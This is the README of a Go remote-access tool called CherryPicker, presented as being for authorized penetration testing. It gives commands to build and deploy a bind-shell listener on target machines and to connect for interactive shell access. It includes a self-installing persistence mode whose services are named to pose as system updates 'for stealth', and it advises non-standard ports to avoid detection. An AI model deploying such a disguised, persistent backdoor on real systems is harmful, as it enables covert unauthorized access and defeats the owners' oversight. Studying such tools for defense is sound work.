# CherryPicker

Authenticated bind shell for authorized penetration testing. Deploy a listener on target systems, then connect remotely to establish interactive shell access.

## ⚠️ Legal Disclaimer

This tool is designed **exclusively for authorized penetration testing** and security research. Unauthorized use of this tool against systems you don't own or have explicit permission to test is **illegal** and punishable by law.

**Only use this tool:**
- On systems you own
- During authorized penetration tests with written permission
- In controlled lab environments

## What It Does

CherryPicker is a two-part remote access tool consisting of:

1. **Target Module** - Deployed on authorized target systems, listens on a TCP port
2. **Attacker Module** - Run from your attack machine, connects to target and provides shell access

Communication is protected by challenge-response authentication using a shared secret key.

## How It Works

```
1. Deploy target module on authorized system → Listens on port
2. Run attacker module from your machine → Connects to target
3. Authentication handshake → SHA256 challenge-response
4. Interactive shell spawned → Full command execution
```

## Quick Start

### 1. Build Both Modules

```bash
# Build target module (to deploy on target)
cd target
go build -o cherrypicker-target

# Build attacker module (for your machine)
cd ../attacker
go build -o cherrypicker-attacker
```

**Cross-compile for different platforms:**
```bash
# Linux target
cd target && GOOS=linux GOARCH=amd64 go build -o cherrypicker-target-linux

# Windows target
cd target && GOOS=windows GOARCH=amd64 go build -o cherrypicker-target.exe

# macOS target (M1/M2)
cd target && GOOS=darwin GOARCH=arm64 go build -o cherrypicker-target-mac
```

### 2. Deploy Target Module

Copy `cherrypicker-target` to your authorized target system.

**Option A: Run manually**
```bash
# Port and signature are now REQUIRED
./cherrypicker-target -p 8888 -s "YourSecretKey123"

# Example with different port
./cherrypicker-target -p 31337 -s "Xk9m#pL2$vN8@qR5"
```

**Option B: Install as persistent service (auto-start on boot)**
```bash
# Linux (requires root) - port and signature REQUIRED
sudo ./cherrypicker-target -install -p 8888 -s "YourSecretKey123"

# macOS (requires root)
sudo ./cherrypicker-target -install -p 8888 -s "YourSecretKey123"

# Windows (requires admin)
cherrypicker-target.exe -install -p 8888 -s "YourSecretKey123"
```

The `-install` flag will:
- ✅ Detect OS automatically (Linux/macOS/Windows)
- ✅ Install as system service/daemon
- ✅ Start immediately
- ✅ Auto-start on every boot
- ✅ Restart automatically if crashed
- ✅ Use generic service names to blend in

**Service names:**
- Linux: `system-update.service`
- macOS: `com.system.update`
- Windows: `SystemUpdate`

### 3. Connect from Attacker

From your attack machine:

```bash
# Connect (both target and port are required)
./cherrypicker-attacker -t 192.168.1.50 -p 9999

# With custom authentication signature (must match target)
./cherrypicker-attacker -t 192.168.1.50 -p 8888 -s "YourSecretKey123"

# With connection timeout
./cherrypicker-attacker -t 192.168.1.50 -p 9999 -timeout 30
```

If authentication succeeds, you'll get an interactive shell on the target.

## Command-Line Options

### Target Module
| Flag | Default | Required | Description |
|------|---------|----------|-------------|
| `-p` | - | ✅ | Port to listen on |
| `-s` | - | ✅ | Authentication signature/key (min 10 chars) |
| `-install` | false | ❌ | Install as persistent service/daemon (requires root/admin) |

### Attacker Module
| Flag | Default | Required | Description |
|------|---------|----------|-------------|
| `-t` | - | ✅ | Target IP address |
| `-p` | - | ✅ | Target port number |
| `-s` | - | ✅ | Authentication signature/key (must match target) |
| `-timeout` | 10 | ❌ | Connection timeout in seconds |

## Architecture

```
┌─────────────────┐                    ┌──────────────────┐
│  Attacker       │                    │  Target          │
│  (Your Machine) │                    │  (Remote System) │
│                 │                    │                  │
│  ./attacker     │───── Connect ─────→│  :9999           │
│  -target IP     │                    │  (listening)     │
│  -port 9999     │                    │                  │
│                 │←──── Challenge ────│  Random nonce    │
│                 │                    │                  │
│  SHA256(nonce+  │───── Response ────→│  Verify hash     │
│         key)    │                    │                  │
│                 │                    │                  │
│                 │←──── AUTH_OK ──────│  Spawn shell     │
│                 │                    │                  │
│  Interactive    │←──── Shell I/O ────│  /bin/sh or      │
│  Shell          │                    │  cmd.exe         │
└─────────────────┘                    └──────────────────┘
```

## Authentication

Uses **SHA256 challenge-response** to prevent unauthorized access:

1. Target generates random challenge (16 bytes hex)
2. Attacker receives challenge
3. Attacker computes: `SHA256(challenge + shared_key)`
4. Attacker sends response hash
5. Target verifies hash matches expected value
6. If valid → shell spawned, If invalid → connection closed

**Both sides must use the exact same authentication key.**

## Features

- ✅ Challenge-response authentication (SHA256)
- ✅ Cross-platform (Linux, macOS, Windows)
- ✅ **Self-installing persistence** - One command to install as service/daemon
- ✅ **Auto-start on boot** - Survives reboots automatically
- ✅ **Auto-restart on crash** - Maintains availability
- ✅ Automatic shell detection per OS
- ✅ IPv6 support
- ✅ Configurable ports and keys
- ✅ Connection timeouts
- ✅ System information banner
- ✅ No hardcoded credentials
- ✅ Generic service names for stealth

## Security Considerations

⚠️ **All parameters are now required - no insecure defaults!**

- Use strong, random signatures (minimum 10 characters enforced)
- Signatures are case-sensitive
- Target listens on all interfaces (0.0.0.0) - consider firewall rules
- Use non-standard ports to avoid detection
- Monitor connection attempts
- No encryption on shell traffic - use over trusted networks only
- Consider SSH tunneling for additional security

## Example Usage Scenarios

**Basic deployment:**
```bash
# On target (192.168.1.50) - all parameters required
./cherrypicker-target -p 9999 -s "MySecretSignature"

# On attacker
./cherrypicker-attacker -t 192.168.1.50 -p 9999 -s "MySecretSignature"
```

**Persistent deployment (auto-start on boot):**
```bash
# On target - install as service
sudo ./cherrypicker-target -install -p 31337 -s "Xk9m#pL2$vN8@qR5"

# On attacker - connect anytime
./cherrypicker-attacker -t 192.168.1.50 -p 31337 -s "Xk9m#pL2$vN8@qR5"

# Target will auto-start after reboot, no manual intervention needed
```

**Secure deployment with custom signature:**
```bash
# On target
./cherrypicker-target -p 31337 -s "Xk9m#pL2$vN8@qR5"

# On attacker
./cherrypicker-attacker -t 192.168.1.50 -p 31337 -s "Xk9m#pL2$vN8@qR5"
```

**IPv6 support:**
```bash
./cherrypicker-attacker -t 2001:db8::1 -p 9999
./cherrypicker-attacker -t fe80::1 -p 9999
```

## Troubleshooting

**"Connection refused"**
- Verify target module is running
- Check firewall rules on target
- Confirm IP address and port are correct

**"Authentication failed"**
- Ensure both sides use identical `-s` values
- Signatures are case-sensitive
- No extra spaces in signature strings

**"Connection timeout"**
- Target may be unreachable
- Increase `-timeout` value
- Test basic connectivity with `ping` or `telnet`

**"Port already in use"**
- Another service is using the port
- Choose a different port number
- Check with: `netstat -tulpn | grep <port>` (Linux)

**Remove installed persistence:**
```bash
# Linux
sudo systemctl stop system-update
sudo systemctl disable system-update
sudo rm /etc/systemd/system/system-update.service

# macOS
sudo launchctl unload /Library/LaunchDaemons/com.system.update.plist
sudo rm /Library/LaunchDaemons/com.system.update.plist

# Windows
sc stop SystemUpdate
sc delete SystemUpdate
```

## Building from Source

```bash
# Clone repository
git clone https://github.com/azizhayat37/cherrypicker.git
cd cherrypicker

# Initialize Go module (if needed)
go mod init cherrypicker
go mod tidy

# Build both modules
cd target && go build -o cherrypicker-target
cd ../attacker && go build -o cherrypicker-attacker
```

## Project Structure

```
cherrypicker/
├── target/
│   └── main.go          # Target listener module
├── attacker/
│   └── main.go          # Attacker client module
├── README.md            # This file
├── USAGE.md            # Detailed usage guide
└── LICENSE
```

## License

For authorized penetration testing use only. See LICENSE file.
